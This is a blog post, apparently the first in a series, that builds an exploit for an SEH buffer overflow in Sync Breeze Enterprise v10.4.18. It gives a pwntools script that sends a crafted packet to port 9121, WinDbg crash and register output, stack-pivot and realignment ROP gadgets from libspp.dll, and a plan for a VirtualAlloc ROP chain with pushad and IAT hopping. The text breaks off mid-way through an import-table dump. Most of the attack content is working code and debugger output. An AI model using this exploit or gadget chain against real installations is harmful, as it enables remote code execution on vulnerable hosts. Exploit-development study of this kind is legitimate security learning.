<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.814201782510">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.11.0">

    <!-- Primary Meta Tags -->
    <title>Sync Breeze Enterprise v10.4.18</title>
    <meta name="title" content="Sync Breeze Enterprise v10.4.18">
    <meta name="description" content="I'm going to start a series on exploiting a few older Windows applications to get a stronger understanding of how to create more sophisticated...">

    <!-- Canonical -->
    <link rel="canonical" href="https://eljayright.github.io/windows-binary-exploitation/sync-breeze-enterprise-v10.4.18/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://eljayright.github.io/windows-binary-exploitation/sync-breeze-enterprise-v10.4.18/">
    <meta property="og:title" content="Sync Breeze Enterprise v10.4.18">
    <meta property="og:description" content="I'm going to start a series on exploiting a few older Windows applications to get a stronger understanding of how to create more sophisticated...">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://eljayright.github.io/windows-binary-exploitation/sync-breeze-enterprise-v10.4.18/">
    <meta property="twitter:title" content="Sync Breeze Enterprise v10.4.18">
    <meta property="twitter:description" content="I'm going to start a series on exploiting a few older Windows applications to get a stronger understanding of how to create more sophisticated...">

    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>

    <link href="../../resources/css/retype.css?v=3.11.0.814201782510" rel="stylesheet">

    <script data-cfasync="false" src="../../resources/js/config.js?v=3.11.0.814201782510" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.11.0.814201782510" data-turbo-eval="false" defer></script>
</head>
<body>
    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
    
        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="retype-branding-logo" href="../../" class="flex items-center leading-snug text-2xl">
                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">ElJayRight</span>
                        </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">dev-notes</span>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav id="retype-header-nav" class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/eljayright" target="_blank">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                        </g>
                                    </svg>
                                    <span>GitHub</span>
                                </a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="retype-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
    
        <div id="retype-container" class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
            
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                </div>
            
                <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                        <span class="text-xs whitespace-nowrap">Powered by</span>
                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                    </a>
                </div>
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/eljayright" target="_blank">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                <g fill="currentColor">
                                                    <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                                </g>
                                            </svg>
                                            <span>GitHub</span>
                                        </a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
            
                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                            <span class="text-xs whitespace-nowrap">Powered by</span>
                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                        </a>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 bg-body-bg">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="retype-markdown" id="retype-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="retype-sidebar-right-toggle"></div>
                                <!-- Page content  -->
<doc-anchor-target id="sync-breeze-enterprise-v10418" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#sync-breeze-enterprise-v10418">#</doc-anchor-trigger>
        <span>Sync Breeze Enterprise v10.4.18</span>
    </h1>
</doc-anchor-target>
<doc-anchor-target id="outline">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#outline">#</doc-anchor-trigger>
        <span>Outline</span>
    </h2>
</doc-anchor-target>
<p>I&#x27;m going to start a series on exploiting a few older Windows applications to get a stronger understanding of how to create more sophisticated exploits using modern techniques. To start with I&#x27;ve chosen <code v-pre>Sync Breeze Enterprise v10.4.18</code> as OJ Reeves did an amazing stream a few years back covering how to exploit this which I highly recommend watching. (link here <a href="https://www.youtube.com/watch?v=jta5z4FZagM">https://www.youtube.com/watch?v=jta5z4FZagM</a>).</p>
<p>Instead of blindly copying his rop gadget I&#x27;m going to create a chain for VirtualAlloc, instead of VirtualProtect. At first I wanted to use a different dll but due to bad bytes that isnt easily doable.</p>
<p>DISCLAIMER:
I&#x27;m going to make a lot of mistakes, instead of editing them out, I&#x27;m just going to document them and correct them later on. This should be treated more as how I approach writing an exploit rather then a precise methodology of how to craft an exploit.
With this in mind I will try to explain my reasoning for why I am doing each step. To try to this post from being way to long I&#x27;m going to get less verbose as I go along, as most of this will be following similar steps to before.</p>
<doc-anchor-target id="check-page-permissions">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#check-page-permissions">#</doc-anchor-trigger>
        <span>Check Page Permissions</span>
    </h2>
</doc-anchor-target>
<p>Code to trigger the crash</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">#!/usr/bin/env python3

import pwn

max_buf = 0x400

body = pwn.util.cyclic.cyclic_metasploit(max_buf)

deref_off = pwn.util.cyclic.cyclic_metasploit_find(0x63413187 - 0x24)
eip_off = pwn.util.cyclic.cyclic_metasploit_find(0x33654132)


body = b'A' * deref_off
body += b'B'* 4
body += b'C' * (eip_off - len(body))
body += b'D' * 4
body += b'E' * (max_buf - len(body))

header = b&quot;\x75\x19\xba\xab&quot;
header += pwn.p32(3)
header += pwn.p32(1)
header += pwn.p32(len(body))*2

header += pwn.p32(body[-1])

packet = header+body


s = pwn.remote('192.168.1.254', 9121)

s.send(packet)

response = s.recv(1024)

s.interactive()</code></pre>
</doc-codeblock></div>
<p>Running the application in windbg and then triggering the crash shows:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">(30f8.2de4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files (x86)\Sync Breeze Enterprise\bin\libpal.dll
eax=42424242 ebx=0331fa0c ecx=0331ff08 edx=0331f9c4 esi=0331ff08 edi=0331fb10
eip=008b2a9d esp=0331f998 ebp=0331feb8 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
libpal!SCA_ConfigObj::Deserialize+0x1d:
008b2a9d ff5024          call    dword ptr [eax+24h]  ds:002b:42424266=????????</code></pre>
</doc-codeblock></div>
<p>As this is an SEH exploit we should look at the exception handler chain.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0:012&gt; !exchain
0331fe0c: libpal!md5_starts+149fb (0092df5b)
0331ff44: 44444444
Invalid exception stack at 43434343</code></pre>
</doc-codeblock></div>
<p>This shows that the next SEH handler is <code v-pre>0x44444444</code> or <code v-pre>DDDD</code> which is something we control!
To figure out where to go from here we should check the page permissions of the stack if it is RWX we can do a <code v-pre>pop pop ret;</code> and point the SEH handler to a location on the stack and execute our shell code. If it is not executable (NX / DEP enabled) then we will have to use ROP.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0:012&gt; !address @esp
... snip ...

Usage:                  Stack
Base Address:           0331e000
End Address:            03320000
Region Size:            00002000 (   8.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE

Content source: 1 (target), length: 1724</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="stack-pivot">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#stack-pivot">#</doc-anchor-trigger>
        <span>Stack Pivot</span>
    </h2>
</doc-anchor-target>
<p>When an expection handler is called, the <code v-pre>esp</code> register shall be decremented by a fair bit from where the top of our payload is. To fix this we need to put a gadget in the SEH address (currently populated with <code v-pre>DDDD</code>) that will <code v-pre>add esp &lt;offset&gt;; ret</code> and return esp back to where our shellcode is.</p>
<p>To find the offset, we need esp when the exception is getting handled and the location of the top of our buffer.</p>
<p>At the time of the exception: <code v-pre>0x02d1f560</code> and the top of the buffer is at <code v-pre>0x02d1fa10</code></p>
<p>Meaning we need a jump close to <code v-pre>0x4b0</code></p>
<p>To find this we can use ropper to generate all the possible rop gadgets.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x10039f9e: add esp, 0x4e8; ret 0x18;</code></pre>
</doc-codeblock></div>
<p>This is as close as I could I could get. Updating the script as follows the recrashing the application:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">stack_pivot = 0x10039f9e #add esp, 0x4e8; ret 0x18;

body = b'A' * deref_off
body += b'B'* 4
body += b'C' * (eip_off - len(body))
#body += b'D' * 4
body += pwn.p32(stack_pivot)</code></pre>
</doc-codeblock></div>
<p>Setting a breakpoint and running the application</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0:007&gt; bp 0x10039f9e
0:007&gt; g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=10039f9e edx=77638fd0 esi=00000000 edi=00000000
eip=10039f9e esp=02cbf560 ebp=02cbf580 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
libspp!SCA_ClsReporter::operator=+0x970e:
10039f9e 81c4e8040000    add     esp,4E8h
0:007&gt; t
eax=00000000 ebx=00000000 ecx=10039f9e edx=77638fd0 esi=00000000 edi=00000000
eip=10039fa4 esp=02cbfa48 ebp=02cbf580 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
libspp!SCA_ClsReporter::operator=+0x9714:
10039fa4 c21800          ret     18h
0:007&gt; 
eax=00000000 ebx=00000000 ecx=10039f9e edx=77638fd0 esi=00000000 edi=00000000
eip=41414141 esp=02cbfa64 ebp=02cbf580 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
41414141 ??              ???
0:007&gt; dd @esp
02cbfa64  43434343 43434343 43434343 43434343
02cbfa74  43434343 43434343 43434343 43434343
02cbfa84  43434343 43434343 10039f9e 45454545
02cbfa94  45454545 45454545 45454545 45454545
02cbfaa4  45454545 45454545 45454545 45454545
02cbfab4  45454545 45454545 45454545 45454545
02cbfac4  45454545 45454545 45454545 45454545
02cbfad4  45454545 45454545 45454545 45454545</code></pre>
</doc-codeblock></div>
<p>This shows a few things, the first being that we need to include a ropnop at <code v-pre>0x02cbfa48</code> instead of <code v-pre>AAAA</code>, and that we now control <code v-pre>esp</code>!</p>
<p>Instead of doing a ropnop it would be a good idea to realign the stack. So we need a gadget that will inc esp by <code v-pre>2 + 4N</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x10094a53: add esp, 0xc; ret;</code></pre>
</doc-codeblock></div>
<p>I&#x27;m also going to update the script to land esp at <code v-pre>BBBB</code> instead of <code v-pre>CCCC</code></p>
<p>Looking at the stack layout:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">41414141 41414141 41414141 41414141
41414141 41414141 41414141 41414141
41414141 41414141 41414141 41414141
41414141 41414141 10094A53 41414141
43434343 43434343 43434343 43434343
43434343 43434343 43434343 43434343
43434343 43434343 43434343 43434343
43434343 43434343 43434343 10039F9E</code></pre>
</doc-codeblock></div>
<p>We are going to need to pivot over <code v-pre>10039F9E</code> anyways so may as well do it with the stack alignment resulting in a realignment of <code v-pre>0x28</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x10127d80: add esp, 0x20; ret;</code></pre>
</doc-codeblock></div>
<p>off by <code v-pre>0xc</code> :/</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0x10136de0: add esp, 0x2c; ret;</code></pre>
</doc-codeblock></div>
<p>updated code</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">stack_pivot = 0x10039f9e # add esp, 0x4e8; ret 0x18;
addr_realign = 0x10136de0 # add esp, 0x2c; ret;
rop_start = deref_off - 4

body = b'A' * rop_start
body += pwn.p32(addr_realign)
body += b'B' * (eip_off - len(body))
#body += b'D' * 4
body += pwn.p32(stack_pivot)
body += b'C' * 4
body += b'D' * (max_buf - len(body))</code></pre>
</doc-codeblock></div>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0:007&gt; 
eax=00000000 ebx=00000000 ecx=10039f9e edx=77638fd0 esi=00000000 edi=00000000
eip=43434343 esp=02ccfa94 ebp=02ccf580 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
43434343 ??              ???</code></pre>
</doc-codeblock></div>
<p>Now we dont need to worry about stack pivoting anymore.</p>
<doc-anchor-target id="virtual-alloc-stack-frame">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#virtual-alloc-stack-frame">#</doc-anchor-trigger>
        <span>Virtual Alloc Stack Frame</span>
    </h2>
</doc-anchor-target>
<p>As shown before the stack is currently NX so we can use something like <code v-pre>VirtualProtect</code> or <code v-pre>VirtualAlloc</code> to change the page permissions to RWX and execute shellcode on the stack.
To do this we need to create a stack frame for VirtualAlloc and then call a pointer to VirtualAlloc to execute the function. The easiest way to do this is with the <code v-pre>pushad; ret;</code> opcodes. What this will do is push a bunch of registers to the stack:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">Push EAX, ECX, EDX, EBX, original ESP, EBP, ESI, and EDI</code></pre>
</doc-codeblock></div>
<p>So if we can get the right values in each register then call <code v-pre>pushad</code> it will create the stack frame.</p>
<p>Looking at MSDN <code v-pre>VirtualAlloc</code> needs these parameters:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);</code></pre>
</doc-codeblock></div>
<p>For these we can set the following static values:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize, # 0x01 has to be non 0
  [in]           DWORD  flAllocationType, #MEM_COMMIT 0x1000
  [in]           DWORD  flProtect # PAGE_EXECUTE_READWRITE 0x40
);</code></pre>
</doc-codeblock></div>
<p>Following the calling convention we need the registers to be set up as follows:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">EAX = NOP (0x90909090)
ECX = flProtect # 0x40
EDX = flAllocationType #0x1000
EBX = dwSize # not 0
ESP = lpAddress # automatic, as this is the stackpointer lol
EBP = pointer to JMP ESP
ESI = pointer to VirtualAlloc
EDI = ROPNOP (RET)</code></pre>
</doc-codeblock></div>
<p>Now the joys of setting this up :D</p>
<doc-anchor-target id="iat-hopping">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#iat-hopping">#</doc-anchor-trigger>
        <span>IAT Hopping</span>
    </h2>
</doc-anchor-target>
<p>For lols</p>
<p>In the stream, OJ did IAT hopping, and it was super cool, so I&#x27;m going to do it too.</p>
<p>The basic premise is to get the address of a KERNEL32 pointer from <code v-pre>libspp.dll</code> and then find a offset in KERNEL32 to <code v-pre>KERNELBASE!VirtualAlloc</code></p>
<p>To find a pointer in <code v-pre>libspp.dll</code> we can dump the import address table for libspp.dll:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre translate="no" class="language-none"><code v-pre class="language-none">0:007&gt; lm
start    end        module name
00400000 00463000   syncbrs  C (export symbols)       C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe
007d0000 008a4000   libpal   C (export symbols)       C:\Program Files (x86)\Sync Breeze Enterprise\bin\libpal.dll
008b0000 00965000   libsync    (deferred)             
10000000 10226000   libspp   C (export symbols)       C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll
0:007&gt; !dh 0x10000000
... snip ...
       0  DLL characteristics
  187F40 [   4FC8F] address [size] of Export Directory
  184B00 [      8C] address [size] of Import Directory
       0 [       0] address [size] of Resource Directory
       0 [       0] address [size] of Exception Directory
       0 [       0] address [size] of Security Directory
  210000 [   130D0] address [size] of Base Relocation Directory
       0 [       0] address [size] of Debug Directory
       0 [       0] address [size] of Description Directory
       0 [       0] address [size] of Special Directory
       0 [       0] address [size] of Thread Storage Directory
       0 [       0] address [size] of Load Configuration Directory
       0 [       0] address [size] of Bound Import Directory
